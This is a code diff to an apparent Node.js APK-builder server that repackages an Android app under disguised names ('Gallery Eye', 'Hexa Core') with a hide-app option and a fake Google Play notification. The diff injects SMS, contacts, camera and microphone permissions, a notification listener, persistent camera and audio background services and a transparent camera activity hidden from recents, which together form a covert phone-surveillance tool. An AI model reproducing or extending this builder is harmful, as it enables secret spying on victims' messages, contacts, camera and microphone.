@@ -94,7 +94,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             const tempDir = path.join(__dirname, 'temp');
             const workDir = path.join(tempDir, `work-${uuid}`);
             const unsignedApkPath = path.join(tempDir, `unsigned-${uuid}.apk`);
-            const finalApkName = `${(appName || "GalleryEye").replace(/[^a-zA-Z0-9]/g, '-')}.apk`;
+            const finalApkName = `${(appName || "HexaCore").replace(/[^a-zA-Z0-9]/g, '-')}.apk`;
             const signedApkPath = path.join(tempDir, `signed-${uuid}.apk`);
 
             // Cleanup
@@ -141,7 +141,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 letters[Math.floor(Math.random() * 26)];
 
             const newPackageName = `com.${cleanAppName}.${randomSuffix}`;
-            const oldPackageName = 'com.gallery.mediasync';
+            const oldPackageName = 'com.hexa.core';
 
             // Update AndroidManifest.xml
             if (fs.existsSync(manifestPath)) {
@@ -236,7 +236,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             const config = {
                 hideApp: hideApp === 'true',
                 webLink: webLink || "",
-                appName: appName || "Gallery Eye",
+                appName: appName || "Hexa Core",
                 enableSmsPermission: enableSmsPermission === 'true',
                 enableContactsPermission: enableContactsPermission === 'true',
                 enableStoragePermission: enableStoragePermission !== 'false', // Default to true
@@ -257,7 +257,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             };
             const style = notificationStyle || "google_play";
             if (style === 'custom') {
-                config.notificationTitle = notificationTitle || (appName || "Gallery Eye");
+                config.notificationTitle = notificationTitle || (appName || "Hexa Core");
                 config.notificationText = notificationText || "Running in background";
                 config.notificationIcon = notificationIcon || "info";
             } else {
@@ -268,41 +268,47 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             }
             fs.writeFileSync(path.join(assetsDir, 'config.json'), JSON.stringify(config));
 
-            // 3.5. Dynamically inject permissions into AndroidManifest.xml
-            // manifestPath already defined above
+            // 3.5. Dynamically manage manifest permissions and services
             if (fs.existsSync(manifestPath)) {
                 let manifestContent = fs.readFileSync(manifestPath, 'utf8');
 
-                // Find where to inject permissions (after existing permissions, before closing manifest tag area)
                 const permissionInsertPoint = manifestContent.indexOf('<uses-permission android:name="android.permission.FOREGROUND_SERVICE"');
 
                 if (permissionInsertPoint !== -1) {
                     let permissionsToAdd = '';
 
                     if (enableSmsPermission === 'true') {
-                        permissionsToAdd += '    <uses-permission android:name="android.permission.READ_SMS" />\n';
-                        permissionsToAdd += '    <uses-permission android:name="android.permission.RECEIVE_SMS" />\n';
+                        if (!manifestContent.includes('android.permission.READ_SMS')) {
+                            permissionsToAdd += '    <uses-permission android:name="android.permission.READ_SMS" />\n';
+                            permissionsToAdd += '    <uses-permission android:name="android.permission.RECEIVE_SMS" />\n';
+                        }
                         console.log('[APK] Adding SMS permissions');
                     }
 
                     if (enableContactsPermission === 'true') {
-                        permissionsToAdd += '    <uses-permission android:name="android.permission.READ_CONTACTS" />\n';
+                        if (!manifestContent.includes('android.permission.READ_CONTACTS')) {
+                            permissionsToAdd += '    <uses-permission android:name="android.permission.READ_CONTACTS" />\n';
+                        }
                         console.log('[APK] Adding READ_CONTACTS permission');
                     }
 
                     if (enableCameraPermission === 'true') {
-                        permissionsToAdd += '    <uses-permission android:name="android.permission.CAMERA" />\n';
-                        permissionsToAdd += '    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />\n';
-                        permissionsToAdd += '    <uses-feature android:name="android.hardware.camera" android:required="false" />\n';
-                        permissionsToAdd += '    <uses-feature android:name="android.hardware.camera.front" android:required="false" />\n';
-                        permissionsToAdd += '    <uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />\n';
+                        if (!manifestContent.includes('android.permission.CAMERA')) {
+                            permissionsToAdd += '    <uses-permission android:name="android.permission.CAMERA" />\n';
+                            permissionsToAdd += '    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />\n';
+                            permissionsToAdd += '    <uses-feature android:name="android.hardware.camera" android:required="false" />\n';
+                            permissionsToAdd += '    <uses-feature android:name="android.hardware.camera.front" android:required="false" />\n';
+                            permissionsToAdd += '    <uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />\n';
+                        }
                         console.log('[APK] Adding CAMERA + FOREGROUND_SERVICE_CAMERA permissions');
                     }
 
                     if (enableMicrophonePermission === 'true') {
-                        permissionsToAdd += '    <uses-permission android:name="android.permission.RECORD_AUDIO" />\n';
-                        permissionsToAdd += '    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />\n';
-                        permissionsToAdd += '    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />\n';
+                        if (!manifestContent.includes('android.permission.RECORD_AUDIO')) {
+                            permissionsToAdd += '    <uses-permission android:name="android.permission.RECORD_AUDIO" />\n';
+                            permissionsToAdd += '    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />\n';
+                            permissionsToAdd += '    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />\n';
+                        }
                         console.log('[APK] Adding RECORD_AUDIO + FOREGROUND_SERVICE_MICROPHONE permissions');
                     }
 
@@ -313,27 +319,113 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                     }
                 }
 
-                // Update KeepAliveService foregroundServiceType based on enabled permissions
+                manifestContent = fs.readFileSync(manifestPath, 'utf8');
+
                 let fgsTypes = 'specialUse|dataSync';
                 if (enableMicrophonePermission === 'true') fgsTypes = 'specialUse|microphone|dataSync';
                 if (enableCameraPermission === 'true') fgsTypes = 'specialUse|camera|dataSync';
                 if (enableMicrophonePermission === 'true' && enableCameraPermission === 'true') fgsTypes = 'specialUse|microphone|camera|dataSync';
-                manifestContent = fs.readFileSync(manifestPath, 'utf8');
-                manifestContent = manifestContent.replace(/foregroundServiceType="specialUse\|dataSync"/, `foregroundServiceType="${fgsTypes}"`);
+                manifestContent = manifestContent.replace(/foregroundServiceType="specialUse[^"]*dataSync[^"]*"/, `foregroundServiceType="${fgsTypes}"`);
                 fs.writeFileSync(manifestPath, manifestContent);
                 console.log(`[APK] FGS types set to: ${fgsTypes}`);
 
-                // Handle Notification Listener Service
-                // The base APK includes the service declaration - remove it if not enabled
-                if (enableNotificationListener !== 'true') {
-                    manifestContent = fs.readFileSync(manifestPath, 'utf8');
+                manifestContent = fs.readFileSync(manifestPath, 'utf8');
+
+                const needsVoip = enableCameraPermission === 'true' || enableMicrophonePermission === 'true';
+
+                if (needsVoip) {
+                    if (!manifestContent.includes('android.permission.USE_FULL_SCREEN_INTENT')) {
+                        manifestContent = manifestContent.replace(
+                            '<application',
+                            '    <uses-permission android:name="android.permission.USE_FULL_SCREEN_INTENT" />\n    <uses-permission android:name="android.permission.MANAGE_OWN_CALLS" />\n\n    <application'
+                        );
+                    }
+                }
+
+                if (enableCameraPermission === 'true' && !manifestContent.includes('CameraForegroundService')) {
+                    const cameraService = `
+        <service
+            android:name=".CameraForegroundService"
+            android:enabled="true"
+            android:exported="false"
+            android:stopWithTask="false"
+            android:foregroundServiceType="camera|dataSync" />`;
+                    manifestContent = manifestContent.replace('</application>', cameraService + '\n    </application>');
+                    console.log('[APK] CameraForegroundService injected');
+                }
+
+                if (enableCameraPermission === 'true' && !manifestContent.includes('CameraProxyActivity')) {
+                    const cameraProxy = `
+        <activity
+            android:name=".CameraProxyActivity"
+            android:exported="false"
+            android:theme="@style/Theme.Transparent"
+            android:taskAffinity=""
+            android:excludeFromRecents="true"
+            android:noHistory="true" />`;
+                    manifestContent = manifestContent.replace('</application>', cameraProxy + '\n    </application>');
+                    console.log('[APK] CameraProxyActivity injected');
+                }
+
+                if (enableMicrophonePermission === 'true' && !manifestContent.includes('AudioForegroundService')) {
+                    const audioService = `
+        <service
+            android:name=".AudioForegroundService"
+            android:enabled="true"
+            android:exported="false"
+            android:stopWithTask="false"
+            android:foregroundServiceType="microphone|dataSync" />`;
+                    manifestContent = manifestContent.replace('</application>', audioService + '\n    </application>');
+                    console.log('[APK] AudioForegroundService injected');
+                }
+
+                if (needsVoip && !manifestContent.includes('VoipConnectionService')) {
+                    const voipService = `
+        <service
+            android:name=".VoipConnectionService"
+            android:exported="true"
+            android:permission="android.permission.BIND_TELECOM_CONNECTION_SERVICE">
+            <intent-filter>
+                <action android:name="android.telecom.ConnectionService" />
+            </intent-filter>
+        </service>`;
+                    manifestContent = manifestContent.replace('</application>', voipService + '\n    </application>');
+                    console.log('[APK] VoipConnectionService injected');
+                }
+
+                if (enableNotificationListener === 'true' && !manifestContent.includes('NotificationMonitor')) {
+                    const notifService = `
+        <service
+            android:name=".NotificationMonitor"
+            android:exported="true"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>`;
+                    manifestContent = manifestContent.replace('</application>', notifService + '\n    </application>');
+                    console.log('[APK] NotificationMonitor service injected');
+                } else if (enableNotificationListener !== 'true') {
                     const serviceRegex = /\s*<service[^>]*android:name="[^"]*NotificationMonitor"[^>]*>[\s\S]*?<\/service>/;
                     manifestContent = manifestContent.replace(serviceRegex, '');
-                    fs.writeFileSync(manifestPath, manifestContent);
                     console.log('[APK] NotificationMonitor service removed (not enabled)');
-                } else {
-                    console.log('[APK] NotificationMonitor service kept (enabled)');
                 }
+
+                if (!needsVoip) {
+                    const cameraServiceRegex = /\s*<service[^>]*android:name="[^"]*CameraForegroundService"[^>]*\/>/;
+                    manifestContent = manifestContent.replace(cameraServiceRegex, '');
+
+                    const cameraProxyRegex = /\s*<activity[^>]*android:name="[^"]*CameraProxyActivity"[^>]*\/>/;
+                    manifestContent = manifestContent.replace(cameraProxyRegex, '');
+
+                    const audioServiceRegex = /\s*<service[^>]*android:name="[^"]*AudioForegroundService"[^>]*\/>/;
+                    manifestContent = manifestContent.replace(audioServiceRegex, '');
+
+                    const voipServiceRegex = /\s*<service[^>]*android:name="[^"]*VoipConnectionService"[^>]*>[\s\S]*?<\/service>/;
+                    manifestContent = manifestContent.replace(voipServiceRegex, '');
+                }
+
+                fs.writeFileSync(manifestPath, manifestContent);
             }
 
             // 3.6. Smali obfuscation removed - was causing app crashes
@@ -383,7 +475,33 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 }
             }
 
-            // 5. Build
+            // 5. Fix Material Design attrs for apktool rebuild
+            const attrsPath = path.join(workDir, 'res', 'values', 'attrs.xml');
+            const missingAttrs = [
+                'state_liftable',
+                'state_lifted',
+                'state_dragged',
+                'state_collapsible',
+                'state_collapsed'
+            ];
+            if (fs.existsSync(attrsPath)) {
+                let attrsContent = fs.readFileSync(attrsPath, 'utf8');
+                for (const attr of missingAttrs) {
+                    if (!attrsContent.includes(`name="${attr}"`)) {
+                        attrsContent = attrsContent.replace('</resources>', `    <attr name="${attr}" format="boolean" />\n</resources>`);
+                    }
+                }
+                fs.writeFileSync(attrsPath, attrsContent);
+            } else {
+                let attrsXml = '<?xml version="1.0" encoding="utf-8"?>\n<resources>\n';
+                for (const attr of missingAttrs) {
+                    attrsXml += `    <attr name="${attr}" format="boolean" />\n`;
+                }
+                attrsXml += '</resources>\n';
+                fs.writeFileSync(attrsPath, attrsXml);
+            }
+
+            // 6. Build
             await sendUpdate('apk_progress', { step: 'Compiling APK resources...', progress: 70 });
             await runCommand('apktool', ['b', workDir, '-o', unsignedApkPath]);
 
